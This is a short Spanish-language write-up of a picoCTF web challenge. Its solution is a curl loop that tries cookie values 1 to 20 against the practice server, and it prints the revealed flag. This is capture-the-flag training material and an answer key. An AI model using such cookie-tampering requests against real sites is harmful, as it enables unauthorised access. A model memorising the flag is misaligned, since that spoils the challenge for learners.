#### - **Descripción** 
¿A quién no le encantan las galletas? Intenta descubrir cuál es la mejor. [http://mercury.picoctf.net:21485/](http://mercury.picoctf.net:21485/)

#### - **Solución** 
richi@RicardoMedina:~$ for i in {1..20}; do curl -s http://mercury.picoctf.net:21485/check -H "Cookie: name=$i"; done | grep -oE "picoCTF{.*?}"
picoCTF{3v3ry1_l0v3s_c00k135_94190c8a}

richi@RicardoMedina:~$ curl http://mercury.picoctf.net:21485/check -H 'Cookie: name=18' | grep -oE "picoCTF{.*?}"
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1184  100  1184    0     0    923      0  0:00:01  0:00:01 --:--:--   923
picoCTF{3v3ry1_l0v3s_c00k135_94190c8a}

